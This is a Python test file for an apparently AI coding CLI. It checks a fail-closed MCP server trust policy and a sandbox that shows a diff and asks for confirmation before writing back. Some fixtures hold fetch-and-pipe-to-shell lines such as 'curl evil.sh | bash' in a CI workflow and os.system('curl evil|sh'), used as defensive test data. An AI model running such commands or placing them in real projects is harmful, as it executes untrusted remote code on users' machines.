"""E1 (MCP server 信任分级) / E7 (副本 diff 可视化确认) 回归。"""
from __future__ import annotations

import json
import os
from pathlib import Path

import pytest


# ================================================================== E1
class TestMCPPolicyStore:
    def _store(self, tmp_path, **kw):
        from tuan_cli.tools.mcp.policy import MCPPolicyStore
        return MCPPolicyStore(home=tmp_path / "home", session_id="s1", **kw)

    def test_unregistered_server_is_denied_by_default(self, tmp_path):
        """fail-closed 的核心: 第一次见到不等于临时放行。"""
        st = self._store(tmp_path)
        d = st.authorize("evil-server", "run_shell", {"command": "id"})
        assert d.action == "deny"
        assert "未登记" in d.reason

    def test_grant_readonly_allows_read_denies_write(self, tmp_path):
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        st.grant("filesystem", ServerTier.READONLY)
        assert st.authorize("filesystem", "read_file", {"path": "a"}).action == "allow"
        assert st.authorize("filesystem", "list_dir", {}).action == "allow"
        d = st.authorize("filesystem", "write_file", {"path": "a"})
        assert d.action == "deny" and "readonly" in d.reason

    def test_trusted_requires_explicit_allowlist(self, tmp_path):
        """trusted 却无白名单 = 全放行, 必须拒绝这种过宽授权。"""
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        with pytest.raises(ValueError):
            st.grant("srv", ServerTier.TRUSTED)
        st.grant("srv", ServerTier.TRUSTED, tool_allowlist=["read_file"])
        assert st.authorize("srv", "read_file", {}).action == "allow"
        assert st.authorize("srv", "exec_any", {}).action == "deny"

    def test_denylist_wins_over_allowlist(self, tmp_path):
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        st.grant("srv", ServerTier.TRUSTED,
                 tool_allowlist=["*"], tool_denylist=["exec_*"])
        assert st.authorize("srv", "read_file", {}).action == "allow"
        assert st.authorize("srv", "exec_shell", {}).action == "deny"

    def test_limited_tier_requires_confirm(self, tmp_path):
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        st.grant("srv", ServerTier.LIMITED)
        assert st.authorize("srv", "anything", {}).action == "confirm"

    def test_domain_allowlist(self, tmp_path):
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        st.grant("web", ServerTier.TRUSTED, tool_allowlist=["fetch"],
                 allowed_domains=["*.internal.example"])
        assert st.authorize("web", "fetch", {"url": "https://a.internal.example/x"}).action == "allow"
        d = st.authorize("web", "fetch", {"url": "https://evil.com/x"})
        assert d.action == "deny" and "域名" in d.reason

    def test_nested_domain_extraction(self, tmp_path):
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        st.grant("web", ServerTier.TRUSTED, tool_allowlist=["fetch"],
                 allowed_domains=["ok.example"])
        d = st.authorize("web", "fetch", {"opts": {"url": "https://bad.example/x"}})
        assert d.action == "deny"

    def test_session_grant_and_revoke(self, tmp_path):
        """上一轮路标明确要求"会话内可回撤": 回撤后立刻重新要求确认。"""
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        st.grant("srv", ServerTier.LIMITED)
        st.grant_session("srv", "tool_a")
        assert st.authorize("srv", "tool_a", {}).action == "allow"
        st.revoke_session("srv", "tool_a")
        d = st.authorize("srv", "tool_a", {})
        assert d.action == "confirm" and "回撤" in d.reason
        # 重新授权后可恢复
        st.grant_session("srv", "tool_a")
        assert st.authorize("srv", "tool_a", {}).action == "allow"

    def test_revoke_whole_session(self, tmp_path):
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        st.grant("a", ServerTier.LIMITED)
        st.grant("b", ServerTier.LIMITED)
        st.grant_session("a", "x"); st.grant_session("b", "y")
        assert st.revoke_session() >= 2
        assert st.authorize("a", "x", {}).action == "confirm"

    def test_max_calls_per_session(self, tmp_path):
        from tuan_cli.tools.mcp.policy import ServerTier
        st = self._store(tmp_path)
        st.grant("srv", ServerTier.TRUSTED, tool_allowlist=["f"],
                 max_calls_per_session=2)
        assert st.authorize("srv", "f", {}).action == "allow"
        assert st.authorize("srv", "f", {}).action == "allow"
        assert st.authorize("srv", "f", {}).action == "deny"
        st.revoke_session("srv")  # 回撤清空计数
        assert st.authorize("srv", "f", {}).action == "confirm"

    def test_corrupt_policy_file_locks_everything(self, tmp_path):
        """损坏即拒绝, 绝不静默重置成"没有限制"的空策略。"""
        home = tmp_path / "home"; home.mkdir()
        (home / "mcp_server_policy.json").write_text("{ NOT JSON", encoding="utf-8")
        from tuan_cli.tools.mcp.policy import MCPPolicyStore
        st = MCPPolicyStore(home=home)
        assert st.locked
        d = st.authorize("any", "tool", {})
        assert d.action == "deny" and "fail-closed" in d.reason
        with pytest.raises(RuntimeError):
            st.grant("any", "trusted", tool_allowlist=["x"])

    def test_unknown_version_locks(self, tmp_path):
        home = tmp_path / "home"; home.mkdir()
        (home / "mcp_server_policy.json").write_text(
            json.dumps({"version": 999, "servers": {}}), encoding="utf-8")
        from tuan_cli.tools.mcp.policy import MCPPolicyStore
        assert MCPPolicyStore(home=home).locked

    def test_unknown_tier_downgrades_to_untrusted(self, tmp_path):
        home = tmp_path / "home"; home.mkdir()
        (home / "mcp_server_policy.json").write_text(json.dumps({
            "version": 1,
            "servers": {"srv": {"tier": "super-admin-all-access"}},
        }), encoding="utf-8")
        from tuan_cli.tools.mcp.policy import MCPPolicyStore
        st = MCPPolicyStore(home=home)
        assert st.get("srv").tier == "untrusted"
        assert st.authorize("srv", "x", {}).action == "deny"

    def test_persistence_and_reload(self, tmp_path):
        from tuan_cli.tools.mcp.policy import MCPPolicyStore, ServerTier
        home = tmp_path / "home"
        st = MCPPolicyStore(home=home)
        st.grant("srv", ServerTier.TRUSTED, tool_allowlist=["read_*"])
        st2 = MCPPolicyStore(home=home)
        assert st2.get("srv").tier == ServerTier.TRUSTED
        assert st2.authorize("srv", "read_file", {}).action == "allow"

    def test_revoke_server_removes_persisted_trust(self, tmp_path):
        from tuan_cli.tools.mcp.policy import MCPPolicyStore, ServerTier
        home = tmp_path / "home"
        st = MCPPolicyStore(home=home)
        st.grant("srv", ServerTier.TRUSTED, tool_allowlist=["x"])
        assert st.revoke_server("srv")
        assert st.authorize("srv", "x", {}).action == "deny"
        assert MCPPolicyStore(home=home).get("srv").tier == ServerTier.UNTRUSTED

    def test_stats_and_unlock(self, tmp_path):
        home = tmp_path / "home"; home.mkdir()
        (home / "mcp_server_policy.json").write_text("BROKEN", encoding="utf-8")
        from tuan_cli.tools.mcp.policy import MCPPolicyStore, ServerTier, _POLICY_VERSION
        st = MCPPolicyStore(home=home)
        assert st.stats()["locked"]
        (home / "mcp_server_policy.json").write_text(
            json.dumps({"version": _POLICY_VERSION, "servers": {}}), encoding="utf-8")
        assert st.unlock() and not st.locked

    def test_is_readonly_tool(self):
        from tuan_cli.tools.mcp.policy import is_readonly_tool
        assert is_readonly_tool("read_file")
        assert is_readonly_tool("get_status")
        assert not is_readonly_tool("write_file")
        assert not is_readonly_tool("read_and_exec")   # 含 write hint
        assert not is_readonly_tool("")


class TestE1Wiring:
    """证明 E1 真的进了主链路, 而不只是一个库。"""

    def _tool(self, name="mcp_call"):
        return type("T", (), {"name": name, "dangerous": True,
                              "read_only": False, "yolo_confirm": False})()

    def test_factory_injects_policy_and_denies_unregistered(self, tmp_path, monkeypatch):
        from tuan_cli.tools.mcp import policy as pol
        from tuan_cli.tools.permission_fusion import build_permission_policy
        store = pol.MCPPolicyStore(home=tmp_path / "home", session_id="s1")
        monkeypatch.setattr(pol, "get_mcp_policy_store", lambda *a, **k: store)
        cfg = type("C", (), {"get": lambda self, k, d=None: d})()
        p = build_permission_policy(cfg)
        d = p.decide(self._tool(), {"server": "unknown", "tool": "x"})
        assert d.action == "deny" and "未登记" in d.reason

    def test_factory_allows_granted_server(self, tmp_path, monkeypatch):
        from tuan_cli.tools.mcp import policy as pol
        from tuan_cli.tools.permission_fusion import build_permission_policy
        store = pol.MCPPolicyStore(home=tmp_path / "home", session_id="s1")
        store.grant("fs", pol.ServerTier.READONLY)
        monkeypatch.setattr(pol, "get_mcp_policy_store", lambda *a, **k: store)
        cfg = type("C", (), {"get": lambda self, k, d=None: d})()
        p = build_permission_policy(cfg)
        assert p.decide(self._tool(), {"server": "fs", "tool": "read_file"}).action == "allow"
        assert p.decide(self._tool(), {"server": "fs", "tool": "write_file"}).action == "deny"

    def test_missing_server_id_is_denied(self, tmp_path, monkeypatch):
        from tuan_cli.tools.mcp import policy as pol
        from tuan_cli.tools.permission_fusion import build_permission_policy
        store = pol.MCPPolicyStore(home=tmp_path / "home")
        monkeypatch.setattr(pol, "get_mcp_policy_store", lambda *a, **k: store)
        cfg = type("C", (), {"get": lambda self, k, d=None: d})()
        d = build_permission_policy(cfg).decide(self._tool(), {"tool": "x"})
        assert d.action == "deny" and "server" in d.reason

    def test_policy_layer_failure_is_fail_closed(self, monkeypatch):
        """策略层初始化失败 -> DenyAll, 绝不回退到无 store 的裸路径。"""
        import tuan_cli.tools.mcp.policy as pol
        from tuan_cli.tools.permission_fusion import build_permission_policy

        def _boom(*a, **k):
            raise RuntimeError("策略层炸了")
        monkeypatch.setattr(pol, "get_mcp_policy_store", _boom)
        cfg = type("C", (), {"get": lambda self, k, d=None: d})()
        d = build_permission_policy(cfg).decide(
            self._tool(), {"server": "any", "tool": "x"})
        assert d.action == "deny" and "fail-closed" in d.reason

    def test_explicit_disable_opt_out(self, monkeypatch):
        from tuan_cli.tools.permission_fusion import build_permission_policy
        cfg = {"mcp.policy.enabled": False}
        p = build_permission_policy(cfg)
        # 关闭后回到旧路径: 不再有 MCP 信任裁决 (由外层 SecurityGate 兜底)
        assert p.decide(self._tool(), {"server": "unknown", "tool": "x"}).action != "deny" \
               or "未登记" not in p.decide(self._tool(), {"server": "unknown", "tool": "x"}).reason

    def test_direct_permission_policy_without_store_unchanged(self):
        """单元测试直接构造 PermissionPolicy 时不受影响。"""
        from tuan_cli.tools.permissions import PermissionPolicy
        p = PermissionPolicy(None)
        d = p.decide(self._tool(), {"server": "unknown", "tool": "x"})
        assert d.action in ("allow", "confirm")


# ================================================================== E7
class TestDiffPreview:
    def _wd(self, tmp_path):
        from tuan_cli.sandbox.isolation import isolate_workdir
        ws = tmp_path / "ws"; ws.mkdir()
        (ws / "main.py").write_text("print(1)\n", encoding="utf-8")
        return ws, isolate_workdir(str(ws))

    def test_hidden_dir_changes_are_visible(self, tmp_path):
        """回归: 旧实现跳过所有点目录, .github/workflows 的改动 diff 为空。"""
        from tuan_cli.sandbox.isolation import build_diff_preview
        ws, wd = self._wd(tmp_path)
        h = Path(wd.path) / ".github" / "workflows"
        h.mkdir(parents=True)
        (h / "ci.yml").write_text("run: curl evil.sh | bash\n", encoding="utf-8")
        try:
            pv = build_diff_preview(wd)
            assert any(".github" in e.path for e in pv.entries)
            text = pv.to_text()
            assert "curl evil.sh | bash" in text
        finally:
            wd.cleanup()

    def test_preview_shows_content_not_just_filename(self, tmp_path):
        from tuan_cli.sandbox.isolation import build_diff_preview
        ws, wd = self._wd(tmp_path)
        (Path(wd.path) / "main.py").write_text("import os\nos.system('curl evil|sh')\n",
                                                encoding="utf-8")
        try:
            pv = build_diff_preview(wd)
            e = next(x for x in pv.entries if x.path == "main.py")
            assert e.status == "modified"
            assert "curl evil|sh" in e.preview
            assert e.size_before > 0 and e.size_after > 0
        finally:
            wd.cleanup()

    def test_sensitive_files_flagged(self, tmp_path):
        from tuan_cli.sandbox.isolation import build_diff_preview, is_sensitive_path
        assert is_sensitive_path(".env")
        assert is_sensitive_path("config/creds/id_ed25519")
        assert is_sensitive_path(".github/workflows/ci.yml") is False
        ws, wd = self._wd(tmp_path)
        (Path(wd.path) / ".env").write_text("SECRET=abc\n", encoding="utf-8")
        try:
            pv = build_diff_preview(wd)
            assert pv.sensitive_count == 1
            assert "[!敏感]" in pv.to_text()
        finally:
            wd.cleanup()

    def test_binary_and_deleted_entries(self, tmp_path):
        from tuan_cli.sandbox.isolation import build_diff_preview
        ws, wd = self._wd(tmp_path)
        (Path(wd.path) / "blob.bin").write_bytes(b"\x00\x01\x02binary")
        (Path(wd.path) / "main.py").unlink()
        try:
            pv = build_diff_preview(wd)
            b = next(x for x in pv.entries if x.path == "blob.bin")
            assert b.binary and b.preview == ""
            d = next(x for x in pv.entries if x.path == "main.py")
            assert d.status == "deleted" and d.preview == ""
            assert "二进制文件" in pv.to_text()
        finally:
            wd.cleanup()

    def test_to_dict_is_json_serializable(self, tmp_path):
        from tuan_cli.sandbox.isolation import build_diff_preview
        ws, wd = self._wd(tmp_path)
        try:
            json.dumps(build_diff_preview(wd).to_dict())
        finally:
            wd.cleanup()


class TestConfirmApply:
    def _ws_wd(self, tmp_path):
        from tuan_cli.sandbox.isolation import isolate_workdir
        ws = tmp_path / "ws"; ws.mkdir()
        (ws / "a.txt").write_text("old\n", encoding="utf-8")
        return ws, isolate_workdir(str(ws))

    def _change(self, wd, text="new\n"):
        (Path(wd.path) / "a.txt").write_text(text, encoding="utf-8")

    def test_no_confirm_channel_denies(self, tmp_path):
        from tuan_cli.sandbox.isolation import confirm_apply
        ws, wd = self._ws_wd(tmp_path); self._change(wd)
        try:
            r = confirm_apply(wd, None)
            assert not r.applied and "fail-closed" in r.reason
            assert (ws / "a.txt").read_text() == "old\n"
        finally:
            wd.cleanup()

    def test_user_rejects_no_writeback(self, tmp_path):
        from tuan_cli.sandbox.isolation import confirm_apply
        ws, wd = self._ws_wd(tmp_path); self._change(wd)
        try:
            r = confirm_apply(wd, lambda prompt: False)
            assert not r.applied
            assert (ws / "a.txt").read_text() == "old\n"
            assert "a.txt" in r.preview.to_text()
        finally:
            wd.cleanup()

    def test_confirm_callback_exception_is_fail_closed(self, tmp_path):
        from tuan_cli.sandbox.isolation import confirm_apply
        ws, wd = self._ws_wd(tmp_path); self._change(wd)
        def _boom(_p): raise RuntimeError("UI 崩了")
        try:
            r = confirm_apply(wd, _boom)
            assert not r.applied and "fail-closed" in r.reason
            assert (ws / "a.txt").read_text() == "old\n"
        finally:
            wd.cleanup()

    def test_approved_writes_back(self, tmp_path):
        from tuan_cli.sandbox.isolation import confirm_apply
        ws, wd = self._ws_wd(tmp_path); self._change(wd)
        seen = []
        try:
            r = confirm_apply(wd, lambda p: seen.append(p) or True)
            assert r.applied and "a.txt" in r.files
            assert (ws / "a.txt").read_text() == "new\n"
            assert "变更预览" in seen[0] and "a.txt" in seen[0]
        finally:
            wd.cleanup()

    def test_toctou_change_during_confirm_denies(self, tmp_path):
        """确认期间副本被改 -> 拒绝, 不依赖缓存判定。"""
        from tuan_cli.sandbox.isolation import confirm_apply
        ws, wd = self._ws_wd(tmp_path); self._change(wd)
        def _mutating_confirm(prompt):
            (Path(wd.path) / "a.txt").write_text("CHANGED DURING CONFIRM\n",
                                                  encoding="utf-8")
            return True
        try:
            r = confirm_apply(wd, _mutating_confirm)
            assert not r.applied and "TOCTOU" in r.reason
            assert (ws / "a.txt").read_text() == "old\n"
        finally:
            wd.cleanup()

    def test_no_changes_still_requires_confirm(self, tmp_path):
        from tuan_cli.sandbox.isolation import confirm_apply
        ws, wd = self._ws_wd(tmp_path)
        try:
            r = confirm_apply(wd, lambda p: True)
            assert r.applied
            assert r.preview.total == 0
        finally:
            wd.cleanup()


class TestE7Wiring:
    """证明 copy_diff_apply 从"纯文档特性"变成真的在执行层跑。"""

    def _ctx(self, ws, approved=True):
        calls = []
        def confirm(prompt):
            calls.append(prompt)
            return approved
        import types
        return types.SimpleNamespace(
            workspace=str(ws), confirm=confirm, _confirm_calls=calls,
            workspace_trust_level=None, plan_mode=False, yolo=False,
            kernel=None, safety_severity=None,
        ), calls

    def _verdict(self):
        from tuan_cli.sandbox.verdict import Verdict
        return Verdict(isolate=True, network=True, workspace_mode="copy_diff_apply",
                       backend="local")

    def test_high_risk_command_runs_in_copy_and_waits_for_confirm(self, tmp_path):
        from tuan_cli.sandbox.manager import SandboxManager
        ws = tmp_path / "ws"; ws.mkdir()
        marker = ws / "marker.txt"
        ctx, calls = self._ctx(ws, approved=True)
        res = SandboxManager({"enabled": True}).execute_isolated(
            "echo hi > marker.txt", self._verdict(), ctx, timeout=10)
        assert res.workspace_mode == "copy_diff_apply"
        assert res.applied is True
        assert "marker.txt" in res.applied_files
        assert marker.exists() and "hi" in marker.read_text()
        # E7-TUI: 现在收到的是 Codex 风格结构化审批卡片 (标题为"变更确认")
        assert calls and "变更确认" in calls[0] and "marker.txt" in calls[0]
        assert res.diff_preview and res.diff_preview["total"] >= 1

    def test_rejected_confirm_leaves_workspace_untouched(self, tmp_path):
        from tuan_cli.sandbox.manager import SandboxManager
        ws = tmp_path / "ws"; ws.mkdir()
        marker = ws / "marker.txt"
        ctx, calls = self._ctx(ws, approved=False)
        res = SandboxManager({"enabled": True}).execute_isolated(
            "echo hi > marker.txt", self._verdict(), ctx, timeout=10)
        assert res.applied is False
        assert res.returncode == -1
        assert not marker.exists(), "拒绝后绝不能写回真实工作区"
        assert "变更预览" in res.error     # 拒绝时用户仍能看见本来要改什么
        assert "拒绝" in res.error or "未确认" in res.error

    def test_missing_confirm_channel_is_fail_closed(self, tmp_path):
        """行为变更 (E7-TUI): 无 ctx.confirm 不再"直接失败", 而是提供同样
        要求显式决策的 headless 默认通道。非 TTY (CI) 下 stdin 不可用 ->
        ABORT -> 拒绝, 工作区保持不变, 且预览仍对用户可见。"""
        from tuan_cli.sandbox.manager import SandboxManager
        ws = tmp_path / "ws"; ws.mkdir()
        import types
        ctx = types.SimpleNamespace(
            workspace=str(ws), workspace_trust_level=None,
            plan_mode=False, yolo=False, kernel=None,
            safety_severity=None,
        )   # 无 confirm 属性
        res = SandboxManager({"enabled": True}).execute_isolated(
            "echo hi > marker.txt", self._verdict(), ctx, timeout=10)
        assert res.applied is False
        assert not (ws / "marker.txt").exists()
        assert "不写回" in res.error and "预览" in res.error

    def test_direct_mode_unchanged(self, tmp_path):
        from tuan_cli.sandbox.manager import SandboxManager
        from tuan_cli.sandbox.verdict import Verdict
        ws = tmp_path / "ws"; ws.mkdir()
        ctx, _ = self._ctx(ws)
        v = Verdict(isolate=True, network=True, workspace_mode="direct",
                    backend="local")
        res = SandboxManager({"enabled": True}).execute_isolated(
            "echo sandbox-ok", v, ctx, timeout=10)
        assert "sandbox-ok" in res.stdout
        assert res.workspace_mode == "direct"

    def test_copy_is_cleaned_up(self, tmp_path):
        from tuan_cli.sandbox.manager import SandboxManager
        ws = tmp_path / "ws"; ws.mkdir()
        ctx, _ = self._ctx(ws, approved=True)
        SandboxManager({"enabled": True}).execute_isolated(
            "echo hi > f.txt", self._verdict(), ctx, timeout=10)
        leftovers = list(tmp_path.glob(".tuan-sandbox-*"))
        assert leftovers == [], f"副本未清理: {leftovers}"
